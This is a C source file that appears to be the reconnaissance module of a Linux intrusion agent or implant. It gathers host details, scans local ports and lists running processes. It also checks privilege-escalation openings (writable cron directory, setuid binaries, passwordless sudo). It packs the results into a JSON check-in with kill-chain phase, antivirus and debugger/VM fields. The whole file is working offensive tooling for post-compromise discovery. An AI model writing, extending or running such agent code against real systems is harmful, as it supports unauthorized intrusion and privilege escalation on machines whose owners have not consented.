// linux-agent/src/recon_linux.c
#include "recon_linux.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>

// -- OS ---------------------------------------------------------------
static void collect_os_linux(char* buf, size_t size) {
    strncpy(buf, "Linux", size);
}

// -- Privilege level --------------------------------------------------
static void collect_priv_linux(char* buf, size_t size) {
    if (getuid() == 0)
        strncpy(buf, "admin", size); // root
    else
        strncpy(buf, "user", size);
}

// -- Open ports (connect scan) ----------------------------------------
static int g_ports[] = {21,22,23,25,53,80,110,443,445,3389,
                        8080,8443,1433,3306,5432,6379,27017,0};

static void collect_ports_linux(int* ports, int* count) {
    *count = 0;
    for (int i = 0; g_ports[i] && *count < MAX_PORTS_L; i++) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct timeval tv = {0, 300000}; // 300ms
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(g_ports[i]);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0)
            ports[(*count)++] = g_ports[i];
        close(s);
    }
}

// -- Services ---------------------------------------------------------
static void collect_services_linux(char svcs[][64], int* count) {
    *count = 0;
    FILE* fp = popen("ps -eo comm --no-headers 2>/dev/null", "r");
    if (!fp) return;
    char line[64];
    while (fgets(line, sizeof(line), fp) && *count < MAX_SERVICES_L) {
        line[strcspn(line, "\n")] = 0;
        strncpy(svcs[(*count)++], line, 63);
    }
    pclose(fp);
}

// -- Linux-specific boolean flags -------------------------------------
static int collect_writable_cron() {
    return access("/etc/cron.d", W_OK) == 0;
}

static int collect_setuid_binaries() {
    FILE* fp = popen(
        "find /usr/bin /usr/sbin -perm -4000 2>/dev/null | wc -l", "r");
    if (!fp) return 0;
    int n = 0;
    fscanf(fp, "%d", &n);
    pclose(fp);
    return n > 0;
}

static int collect_sudo_misconfigured() {
    FILE* fp = popen("sudo -n true 2>/dev/null && echo yes", "r");
    if (!fp) return 0;
    char buf[8] = {0};
    fgets(buf, sizeof(buf), fp);
    pclose(fp);
    return strncmp(buf, "yes", 3) == 0;
}

// -- Hostname, username, arch, IP, OS version -------------------------
static void collect_hostname_linux(char* buf, size_t size) {
    if (gethostname(buf, size) != 0)
        strncpy(buf, "UNKNOWN", size);
}

static void collect_username_linux(char* buf, size_t size) {
    char* user = getenv("USER");
    if (user)
        strncpy(buf, user, size);
    else
        strncpy(buf, "UNKNOWN", size);
}

static void collect_arch_linux(char* buf, size_t size) {
    struct utsname un;
    if (uname(&un) == 0)
        strncpy(buf, un.machine, size);
    else
        strncpy(buf, "unknown", size);
}

static void collect_ip_linux(char* buf, size_t size) {
    struct ifaddrs* ifaddr = NULL;
    if (getifaddrs(&ifaddr) != 0) {
        strncpy(buf, "0.0.0.0", size);
        return;
    }
    for (struct ifaddrs* ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (ifa->ifa_flags & IFF_LOOPBACK) continue;
        struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
        inet_ntop(AF_INET, &sa->sin_addr, buf, size);
        break;
    }
    freeifaddrs(ifaddr);
}

static void collect_os_version_linux(char* buf, size_t size) {
    struct utsname un;
    if (uname(&un) == 0)
        snprintf(buf, size, "%s %s", un.sysname, un.release);
    else
        strncpy(buf, "Linux unknown", size);
}

// -- Public API -------------------------------------------------------
int recon_collect_linux(checkin_info_linux* info) {
    memset(info, 0, sizeof(checkin_info_linux));
    collect_os_linux(info->os, sizeof(info->os));
    collect_priv_linux(info->privilege_level, sizeof(info->privilege_level));
    collect_ports_linux(info->open_ports, &info->port_count);
    collect_services_linux(info->running_services, &info->service_count);
    info->writable_cron = collect_writable_cron();
    info->setuid_binaries = collect_setuid_binaries();
    info->sudo_misconfigured = collect_sudo_misconfigured();
    collect_hostname_linux(info->hostname, sizeof(info->hostname));
    collect_username_linux(info->username, sizeof(info->username));
    collect_os_version_linux(info->os_version, sizeof(info->os_version));
    info->pid = (int)getpid();
    collect_arch_linux(info->arch, sizeof(info->arch));
    collect_ip_linux(info->ip, sizeof(info->ip));
    strncpy(info->current_phase, "discovery", sizeof(info->current_phase));
    return 0;
}

int recon_serialize_linux(const checkin_info_linux* info,
                          char** json_out, size_t* json_len) {
    char* buf = malloc(4096);
    if (!buf) return -1;

    // Build ports array
    char ports[256] = "[";
    for (int i = 0; i < info->port_count; i++) {
        char tmp[16];
        snprintf(tmp, sizeof(tmp), "%d", info->open_ports[i]);
        strcat(ports, tmp);
        if (i < info->port_count - 1) strcat(ports, ",");
    }
    strcat(ports, "]");

    // Build services array
    char svcs[1024] = "[";
    for (int i = 0; i < info->service_count; i++) {
        strcat(svcs, "\"");
        strcat(svcs, info->running_services[i]);
        strcat(svcs, "\"");
        if (i < info->service_count - 1) strcat(svcs, ",");
    }
    strcat(svcs, "]");

    snprintf(buf, 4096,
        "{"
        "\"os\":\"%s\","
        "\"privilege_level\":\"%s\","
        "\"open_ports\":%s,"
        "\"running_services\":%s,"
        "\"domain_joined\":%s,"
        "\"active_directory\":false,"
        "\"antivirus_running\":%s,"
        "\"lsass_accessible\":false,"
        "\"ntlm_auth\":false,"
        "\"current_kill_chain_phase\":\"%s\","
        "\"hostname\":\"%s\","
        "\"username\":\"%s\","
        "\"os_version\":\"%s\","
        "\"pid\":%d,"
        "\"arch\":\"%s\","
        "\"ip\":\"%s\","
        "\"is_debugged\":false,"
        "\"is_vm\":false"
        "}",
        info->os,
        info->privilege_level,
        ports, svcs,
        info->domain_joined ? "true" : "false",
        info->antivirus_running ? "true" : "false",
        info->current_phase,
        info->hostname,
        info->username,
        info->os_version,
        info->pid,
        info->arch,
        info->ip);

    *json_out = buf;
    *json_len = strlen(buf);
    return 0;
}

void recon_print_linux(const checkin_info_linux* info) {
    printf("[RECON] OS:         %s\n", info->os);
    printf("[RECON] Privilege:  %s\n", info->privilege_level);
    printf("[RECON] Hostname:   %s\n", info->hostname);
    printf("[RECON] Username:   %s\n", info->username);
    printf("[RECON] OS Version: %s\n", info->os_version);
    printf("[RECON] PID:        %d\n", info->pid);
    printf("[RECON] Arch:       %s\n", info->arch);
    printf("[RECON] IP:         %s\n", info->ip);
    printf("[RECON] Ports:      %d open\n", info->port_count);
    printf("[RECON] Services:   %d running\n", info->service_count);
    printf("[RECON] Phase:      %s\n", info->current_phase);
}
